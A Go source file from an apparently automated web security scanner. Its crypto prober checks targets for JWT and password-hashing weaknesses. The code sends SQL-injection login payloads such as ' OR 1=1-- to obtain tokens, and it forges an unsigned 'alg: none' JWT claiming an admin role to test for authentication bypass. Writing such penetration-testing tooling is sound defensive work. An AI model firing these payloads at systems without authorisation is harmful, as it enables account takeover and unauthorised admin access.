package probers

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// CryptoProber tests for cryptographic and token-related vulnerabilities.
type CryptoProber struct{}

func (p *CryptoProber) Name() string { return "crypto" }

func (p *CryptoProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	findings = append(findings, p.testJWTWeaknesses(cfg)...)
	findings = append(findings, p.testJWTNoneAlgorithm(cfg)...)
	findings = append(findings, p.testPasswordHashing(cfg)...)

	return findings
}

func (p *CryptoProber) testJWTWeaknesses(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Try to get a valid JWT by logging in
	token := ""
	if cfg.AuthToken != "" && strings.HasPrefix(cfg.AuthToken, "Bearer ") {
		token = strings.TrimPrefix(cfg.AuthToken, "Bearer ")
	}

	if token == "" && cfg.Classified != nil {
		// Try to obtain a token via login
		for _, ep := range cfg.Classified.Login {
			for _, payload := range []string{
				`{"email":"' OR 1=1--","password":"anything"}`,
				`{"username":"' OR 1=1--","password":"anything"}`,
				`{"email":"test@test.com","password":"test"}`,
			} {
				status, _, respBody, err := cfg.DoRequest("POST", ep.URL,
					strings.NewReader(payload), map[string]string{"Content-Type": "application/json"})
				if err != nil || status != 200 {
					continue
				}
				token = extractAuthToken(respBody)
				if token != "" {
					break
				}
			}
			if token != "" {
				break
			}
		}
	}

	if token == "" {
		return findings
	}

	// Analyze JWT structure
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return findings
	}

	// Decode header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return findings
	}
	header := string(headerBytes)

	// Check for weak algorithm
	if strings.Contains(header, `"HS256"`) || strings.Contains(header, `"HS384"`) || strings.Contains(header, `"HS512"`) {
		findings = append(findings, MakeFinding(
			"Weak JWT Algorithm - HMAC Symmetric Signing",
			"Medium",
			fmt.Sprintf("The JWT uses a symmetric signing algorithm (%s). If the secret key is weak or guessable, tokens can be forged.", header),
			"/",
			"POST",
			"CWE-327",
			fmt.Sprintf(`JWT Header: %s`, header),
			fmt.Sprintf("JWT token uses symmetric algorithm: %s", header),
			"crypto",
			0,
		))
	}

	// Decode payload to check for sensitive data
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err == nil {
		payload := string(payloadBytes)
		if strings.Contains(payload, "password") || strings.Contains(payload, "secret") {
			findings = append(findings, MakeFinding(
				"Sensitive Data in JWT Payload",
				"High",
				"The JWT payload contains sensitive data (password/secret) that should not be included in tokens.",
				"/",
				"POST",
				"CWE-312",
				fmt.Sprintf(`JWT Payload: %s`, truncate(payload, 200)),
				fmt.Sprintf("Sensitive data found in JWT: %s", truncate(payload, 200)),
				"crypto",
				0,
			))
		}

		if strings.Contains(payload, "email") || strings.Contains(payload, "role") {
			findings = append(findings, MakeFinding(
				"Information Disclosure in JWT Token",
				"Low",
				"The JWT token payload contains user email and role information that is visible to any token holder.",
				"/",
				"POST",
				"CWE-200",
				fmt.Sprintf(`JWT Payload (decoded): %s`, truncate(payload, 200)),
				fmt.Sprintf("JWT payload: %s", truncate(payload, 200)),
				"crypto",
				0,
			))
		}
	}

	return findings
}

func (p *CryptoProber) testJWTNoneAlgorithm(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.Classified == nil {
		return findings
	}

	// Create a JWT with "none" algorithm
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"typ":"JWT","alg":"none"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"status":"success","data":{"id":1,"email":"admin@admin.com","role":"admin"},"iat":9999999999}`))
	noneToken := header + "." + payload + "."

	// Try to use it on user data endpoints
	testURLs := make([]string, 0)
	for _, ep := range cfg.Classified.UserData {
		testURLs = append(testURLs, ep.URL)
		if len(testURLs) >= 3 {
			break
		}
	}

	for _, testURL := range testURLs {
		path := extractPath(testURL)
		status, _, respBody, err := cfg.DoRequest("GET", testURL, nil,
			map[string]string{"Authorization": "Bearer " + noneToken})
		if err != nil {
			continue
		}

		if status == 200 && strings.Contains(respBody, "admin") {
			findings = append(findings, MakeFinding(
				"JWT None Algorithm Bypass",
				"Critical",
				"The application accepts JWT tokens with 'none' algorithm, allowing complete authentication bypass and token forging.",
				path,
				"GET",
				"CWE-327",
				fmt.Sprintf(`Token with none alg: %s`, truncate(noneToken, 100)),
				fmt.Sprintf("HTTP %d - Admin access with forged token: %s", status, truncate(respBody, 200)),
				"crypto",
				0,
			))
			return findings
		} else if status == 200 {
			findings = append(findings, MakeFinding(
				"JWT Algorithm Confusion - Potential None Algorithm",
				"High",
				"The application may be vulnerable to JWT algorithm confusion attacks.",
				path,
				"GET",
				"CWE-327",
				fmt.Sprintf(`Token: %s`, truncate(noneToken, 100)),
				fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
				"crypto",
				0,
			))
			return findings
		}
	}

	return findings
}

func (p *CryptoProber) testPasswordHashing(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.Classified == nil {
		return findings
	}

	// Check if any user-related API endpoint exposes password hashes
	for _, ep := range cfg.Classified.API {
		lowerPath := strings.ToLower(extractPath(ep.URL))
		if !strings.Contains(lowerPath, "user") {
			continue
		}

		status, _, respBody, err := cfg.DoRequest("GET", ep.URL, nil, nil)
		if err != nil || status != 200 {
			continue
		}

		if strings.Contains(respBody, "password") {
			if strings.Contains(respBody, "$2") {
				// bcrypt - still bad that it's exposed, but less critical
			} else if strings.Contains(respBody, `"password":"`) || strings.Contains(respBody, `"password_hash":"`) {
				findings = append(findings, MakeFinding(
					"Weak Password Hashing",
					"High",
					"User passwords appear to be hashed with a weak algorithm (MD5 or similar). Password hashes are also exposed via the API.",
					extractPath(ep.URL),
					"GET",
					"CWE-916",
					fmt.Sprintf(`curl %s`, ep.URL),
					fmt.Sprintf("HTTP %d - Hashes exposed: %s", status, truncate(respBody, 200)),
					"crypto",
					0,
				))
			}
			break
		}
	}

	return findings
}
